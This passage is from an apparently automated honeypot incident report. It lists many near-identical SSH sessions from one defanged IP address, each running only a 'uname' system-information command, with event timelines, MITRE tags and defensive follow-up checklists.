**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:09` | `cowrie.session.connect` |
| `2026-08-13 07:09:10` | `cowrie.client.version` |
| `2026-08-13 07:09:10` | `cowrie.client.kex` |
| `2026-08-13 07:09:11` | `cowrie.login.success` |
| `2026-08-13 07:09:12` | `cowrie.session.params` |
| `2026-08-13 07:09:12` | `cowrie.command.input` |
| `2026-08-13 07:09:12` | `cowrie.log.closed` |
| `2026-08-13 07:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a723fd539cff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:16` | `cowrie.session.connect` |
| `2026-08-13 07:09:16` | `cowrie.client.version` |
| `2026-08-13 07:09:16` | `cowrie.client.kex` |
| `2026-08-13 07:09:17` | `cowrie.login.success` |
| `2026-08-13 07:09:18` | `cowrie.session.params` |
| `2026-08-13 07:09:18` | `cowrie.command.input` |
| `2026-08-13 07:09:18` | `cowrie.log.closed` |
| `2026-08-13 07:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a901333c7511

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:22` | `cowrie.session.connect` |
| `2026-08-13 07:09:22` | `cowrie.client.version` |
| `2026-08-13 07:09:22` | `cowrie.client.kex` |
| `2026-08-13 07:09:24` | `cowrie.login.success` |
| `2026-08-13 07:09:26` | `cowrie.session.params` |
| `2026-08-13 07:09:26` | `cowrie.command.input` |
| `2026-08-13 07:09:26` | `cowrie.log.closed` |
| `2026-08-13 07:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02af6709c0e0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:28` | `cowrie.session.connect` |
| `2026-08-13 07:09:29` | `cowrie.client.version` |
| `2026-08-13 07:09:29` | `cowrie.client.kex` |
| `2026-08-13 07:09:31` | `cowrie.login.success` |
| `2026-08-13 07:09:32` | `cowrie.session.params` |
| `2026-08-13 07:09:32` | `cowrie.command.input` |
| `2026-08-13 07:09:33` | `cowrie.log.closed` |
| `2026-08-13 07:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7cd23ed36a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:35` | `cowrie.session.connect` |
| `2026-08-13 07:09:35` | `cowrie.client.version` |
| `2026-08-13 07:09:35` | `cowrie.client.kex` |
| `2026-08-13 07:09:37` | `cowrie.login.success` |
| `2026-08-13 07:09:39` | `cowrie.session.params` |
| `2026-08-13 07:09:39` | `cowrie.command.input` |
| `2026-08-13 07:09:39` | `cowrie.log.closed` |
| `2026-08-13 07:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3102b7327f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:41` | `cowrie.session.connect` |
| `2026-08-13 07:09:41` | `cowrie.client.version` |
| `2026-08-13 07:09:41` | `cowrie.client.kex` |
| `2026-08-13 07:09:44` | `cowrie.login.success` |
| `2026-08-13 07:09:45` | `cowrie.session.params` |
| `2026-08-13 07:09:45` | `cowrie.command.input` |
| `2026-08-13 07:09:45` | `cowrie.log.closed` |
| `2026-08-13 07:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3963937ee052

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:48` | `cowrie.session.connect` |
| `2026-08-13 07:09:48` | `cowrie.client.version` |
| `2026-08-13 07:09:48` | `cowrie.client.kex` |
| `2026-08-13 07:09:49` | `cowrie.login.success` |
| `2026-08-13 07:09:50` | `cowrie.session.params` |
| `2026-08-13 07:09:50` | `cowrie.command.input` |
| `2026-08-13 07:09:50` | `cowrie.log.closed` |
| `2026-08-13 07:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ece31496752

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:09 |
| **Last Seen** | 2026-08-13 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:09:55` | `cowrie.session.connect` |
| `2026-08-13 07:09:55` | `cowrie.client.version` |
| `2026-08-13 07:09:55` | `cowrie.client.kex` |
| `2026-08-13 07:09:56` | `cowrie.login.success` |
| `2026-08-13 07:09:56` | `cowrie.session.params` |
| `2026-08-13 07:09:56` | `cowrie.command.input` |
| `2026-08-13 07:09:57` | `cowrie.log.closed` |
| `2026-08-13 07:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7753d63fbb86

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:02` | `cowrie.session.connect` |
| `2026-08-13 07:10:02` | `cowrie.client.version` |
| `2026-08-13 07:10:02` | `cowrie.client.kex` |
| `2026-08-13 07:10:03` | `cowrie.login.success` |
| `2026-08-13 07:10:04` | `cowrie.session.params` |
| `2026-08-13 07:10:04` | `cowrie.command.input` |
| `2026-08-13 07:10:04` | `cowrie.log.closed` |
| `2026-08-13 07:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1499e30f47c2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:08` | `cowrie.session.connect` |
| `2026-08-13 07:10:08` | `cowrie.client.version` |
| `2026-08-13 07:10:08` | `cowrie.client.kex` |
| `2026-08-13 07:10:09` | `cowrie.login.success` |
| `2026-08-13 07:10:10` | `cowrie.session.params` |
| `2026-08-13 07:10:10` | `cowrie.command.input` |
| `2026-08-13 07:10:10` | `cowrie.log.closed` |
| `2026-08-13 07:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36d093eb6af5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:14` | `cowrie.session.connect` |
| `2026-08-13 07:10:15` | `cowrie.client.version` |
| `2026-08-13 07:10:15` | `cowrie.client.kex` |
| `2026-08-13 07:10:17` | `cowrie.login.success` |
| `2026-08-13 07:10:18` | `cowrie.session.params` |
| `2026-08-13 07:10:18` | `cowrie.command.input` |
| `2026-08-13 07:10:18` | `cowrie.log.closed` |
| `2026-08-13 07:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-463bb97729e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:21` | `cowrie.session.connect` |
| `2026-08-13 07:10:22` | `cowrie.client.version` |
| `2026-08-13 07:10:22` | `cowrie.client.kex` |
| `2026-08-13 07:10:23` | `cowrie.login.success` |
| `2026-08-13 07:10:24` | `cowrie.session.params` |
| `2026-08-13 07:10:24` | `cowrie.command.input` |
| `2026-08-13 07:10:25` | `cowrie.log.closed` |
| `2026-08-13 07:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32cc7822e12d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:28` | `cowrie.session.connect` |
| `2026-08-13 07:10:29` | `cowrie.client.version` |
| `2026-08-13 07:10:29` | `cowrie.client.kex` |
| `2026-08-13 07:10:30` | `cowrie.login.success` |
| `2026-08-13 07:10:31` | `cowrie.session.params` |
| `2026-08-13 07:10:31` | `cowrie.command.input` |
| `2026-08-13 07:10:32` | `cowrie.log.closed` |
| `2026-08-13 07:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e58f21827d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:35` | `cowrie.session.connect` |
| `2026-08-13 07:10:36` | `cowrie.client.version` |
| `2026-08-13 07:10:36` | `cowrie.client.kex` |
| `2026-08-13 07:10:37` | `cowrie.login.success` |
| `2026-08-13 07:10:38` | `cowrie.session.params` |
| `2026-08-13 07:10:38` | `cowrie.command.input` |
| `2026-08-13 07:10:39` | `cowrie.log.closed` |
| `2026-08-13 07:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7796540488e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:42` | `cowrie.session.connect` |
| `2026-08-13 07:10:42` | `cowrie.client.version` |
| `2026-08-13 07:10:42` | `cowrie.client.kex` |
| `2026-08-13 07:10:45` | `cowrie.login.success` |
| `2026-08-13 07:10:46` | `cowrie.session.params` |
| `2026-08-13 07:10:46` | `cowrie.command.input` |
| `2026-08-13 07:10:47` | `cowrie.log.closed` |
| `2026-08-13 07:10:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec01f8375ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:48` | `cowrie.session.connect` |
| `2026-08-13 07:10:49` | `cowrie.client.version` |
| `2026-08-13 07:10:49` | `cowrie.client.kex` |
| `2026-08-13 07:10:52` | `cowrie.login.success` |
| `2026-08-13 07:10:54` | `cowrie.session.params` |
| `2026-08-13 07:10:54` | `cowrie.command.input` |
| `2026-08-13 07:10:56` | `cowrie.log.closed` |
| `2026-08-13 07:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fdf3acf21bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:10 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:10:54` | `cowrie.session.connect` |
| `2026-08-13 07:10:55` | `cowrie.client.version` |
| `2026-08-13 07:10:55` | `cowrie.client.kex` |
| `2026-08-13 07:10:59` | `cowrie.login.success` |
| `2026-08-13 07:11:01` | `cowrie.session.params` |
| `2026-08-13 07:11:01` | `cowrie.command.input` |
| `2026-08-13 07:11:02` | `cowrie.log.closed` |
| `2026-08-13 07:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11705347c42f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:01` | `cowrie.session.connect` |
| `2026-08-13 07:11:02` | `cowrie.client.version` |
| `2026-08-13 07:11:02` | `cowrie.client.kex` |
| `2026-08-13 07:11:05` | `cowrie.login.success` |
| `2026-08-13 07:11:08` | `cowrie.session.params` |
| `2026-08-13 07:11:08` | `cowrie.command.input` |
| `2026-08-13 07:11:09` | `cowrie.log.closed` |
| `2026-08-13 07:11:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3ef5c2cc444

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:07` | `cowrie.session.connect` |
| `2026-08-13 07:11:08` | `cowrie.client.version` |
| `2026-08-13 07:11:08` | `cowrie.client.kex` |
| `2026-08-13 07:11:11` | `cowrie.login.success` |
| `2026-08-13 07:11:13` | `cowrie.session.params` |
| `2026-08-13 07:11:13` | `cowrie.command.input` |
| `2026-08-13 07:11:14` | `cowrie.log.closed` |
| `2026-08-13 07:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-516af21f9e21

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:15` | `cowrie.session.connect` |
| `2026-08-13 07:11:15` | `cowrie.client.version` |
| `2026-08-13 07:11:15` | `cowrie.client.kex` |
| `2026-08-13 07:11:16` | `cowrie.login.success` |
| `2026-08-13 07:11:17` | `cowrie.session.params` |
| `2026-08-13 07:11:17` | `cowrie.command.input` |
| `2026-08-13 07:11:17` | `cowrie.log.closed` |
| `2026-08-13 07:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd8810e72b1e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:21` | `cowrie.session.connect` |
| `2026-08-13 07:11:21` | `cowrie.client.version` |
| `2026-08-13 07:11:21` | `cowrie.client.kex` |
| `2026-08-13 07:11:22` | `cowrie.login.success` |
| `2026-08-13 07:11:23` | `cowrie.session.params` |
| `2026-08-13 07:11:23` | `cowrie.command.input` |
| `2026-08-13 07:11:24` | `cowrie.log.closed` |
| `2026-08-13 07:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99f4b28940eb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:28` | `cowrie.session.connect` |
| `2026-08-13 07:11:28` | `cowrie.client.version` |
| `2026-08-13 07:11:28` | `cowrie.client.kex` |
| `2026-08-13 07:11:29` | `cowrie.login.success` |
| `2026-08-13 07:11:30` | `cowrie.session.params` |
| `2026-08-13 07:11:30` | `cowrie.command.input` |
| `2026-08-13 07:11:30` | `cowrie.log.closed` |
| `2026-08-13 07:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c506dedb645

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:35` | `cowrie.session.connect` |
| `2026-08-13 07:11:35` | `cowrie.client.version` |
| `2026-08-13 07:11:35` | `cowrie.client.kex` |
| `2026-08-13 07:11:36` | `cowrie.login.success` |
| `2026-08-13 07:11:37` | `cowrie.session.params` |
| `2026-08-13 07:11:37` | `cowrie.command.input` |
| `2026-08-13 07:11:37` | `cowrie.log.closed` |
| `2026-08-13 07:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dc7a9e68e92

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:41` | `cowrie.session.connect` |
| `2026-08-13 07:11:42` | `cowrie.client.version` |
| `2026-08-13 07:11:42` | `cowrie.client.kex` |
| `2026-08-13 07:11:44` | `cowrie.login.success` |
| `2026-08-13 07:11:45` | `cowrie.session.params` |
| `2026-08-13 07:11:45` | `cowrie.command.input` |
| `2026-08-13 07:11:45` | `cowrie.log.closed` |
| `2026-08-13 07:11:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3c37986ad2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:49` | `cowrie.session.connect` |
| `2026-08-13 07:11:49` | `cowrie.client.version` |
| `2026-08-13 07:11:49` | `cowrie.client.kex` |
| `2026-08-13 07:11:49` | `cowrie.login.success` |
| `2026-08-13 07:11:50` | `cowrie.session.params` |
| `2026-08-13 07:11:50` | `cowrie.command.input` |
| `2026-08-13 07:11:51` | `cowrie.log.closed` |
| `2026-08-13 07:11:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cdae7473ced

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:11 |
| **Last Seen** | 2026-08-13 07:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:11:55` | `cowrie.session.connect` |
| `2026-08-13 07:11:55` | `cowrie.client.version` |
| `2026-08-13 07:11:55` | `cowrie.client.kex` |
| `2026-08-13 07:11:57` | `cowrie.login.success` |
| `2026-08-13 07:11:59` | `cowrie.session.params` |
| `2026-08-13 07:11:59` | `cowrie.command.input` |
| `2026-08-13 07:11:59` | `cowrie.log.closed` |
| `2026-08-13 07:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ce9ade42d9
